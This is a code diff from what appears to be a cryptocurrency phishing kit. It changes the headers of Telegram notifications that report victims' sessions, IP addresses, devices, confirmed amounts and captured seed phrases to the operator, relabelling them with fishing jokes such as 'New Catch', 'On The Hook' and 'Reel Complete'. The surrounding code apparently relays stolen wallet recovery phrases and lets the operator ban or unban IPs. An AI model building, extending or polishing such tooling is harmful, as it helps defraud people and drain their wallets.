@@ -166,7 +166,7 @@ export function formatTelegramMessage(type, data) {
     switch (type) {
         case 'server_status':
             return [
-                '𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀',
+                'FishTank Status 🐟',
                 SEPARATOR,
                 `⚡️ Status: ${data.status}`,
                 `🔌 Port: ${data.port}`,
@@ -176,7 +176,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'new_session':
             return [
-                '𝗡𝗲𝘄 𝗦𝗲𝘀𝘀𝗶𝗼𝗻',
+                'New Catch 🐟',
                 SEPARATOR,
                 `⌥ Session ID: ${data.id}`,
                 `📱 Device: ${data.userAgent}`,
@@ -188,7 +188,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'review_completed':
             return [
-                '𝗥𝗲𝘃𝗶𝗲𝘄 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱',
+                'Catch Reviewed ✔️🐟',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
                 `🌍 IP Address: ${data.ip}`,
@@ -199,7 +199,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'amount_confirmed':
             return [
-                '𝗔𝗺𝗼𝘂𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱',
+                'On The Hook 🎣🐠',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
                 `💰 Amount: ${data.amount}`,
@@ -210,7 +210,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'seed_phrase':
             return [
-                '𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱',
+                'Reel Complete 🎣✅',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
                 `🌍 IP Address: ${data.ip}`,
@@ -223,7 +223,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'session_ended':
             return [
-                '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗘𝗻𝗱𝗲𝗱',
+                'Line Cut ✂️🎣',
                 SEPARATOR,
                 `⌥ Session ID: ${data.id}`,
                 `⏱ Duration: ${formatDuration(data.duration)}`,
@@ -233,7 +233,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'settings_changed':
             return [
-                '𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗨𝗽𝗱𝗮𝘁𝗲𝗱',
+                'Net Adjusted 🕸️⚙️',
                 SEPARATOR,
                 ...Object.entries(data).map(([key, value]) => 
                     `⚡️ ${key}: ${value}`
@@ -244,7 +244,7 @@ export function formatTelegramMessage(type, data) {
 
         case 'ip_banned':
             return [
-                '𝗜𝗣 𝗕𝗮𝗻𝗻𝗲𝗱',
+                'Catch Rejected 🐟⛔',
                 SEPARATOR,
                 `🌍 IP Address: ${data.ip}`,
                 `👤 Banned By: ${data.bannedBy}`,
@@ -254,7 +254,7 @@ export function formatTelegramMessage(type, data) {
 
             case 'ip_unbanned':
                 return [
-                    '𝗜𝗣 𝗨𝗻𝗯𝗮𝗻𝗻𝗲𝗱',
+                    'Back in Waters 🌊🐠',
                     SEPARATOR,
                     `🌍 IP Address: ${data.ip}`,
                     SEPARATOR,
@@ -263,7 +263,7 @@ export function formatTelegramMessage(type, data) {
     
             case 'session_removed':
                 return [
-                    '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝗲𝗺𝗼𝘃𝗲𝗱',
+                    'Catch Released 👐🐠',
                     SEPARATOR,
                     `⌥ Session ID: ${data.id}`,
                     `👤 Removed By: ${data.removedBy}`,
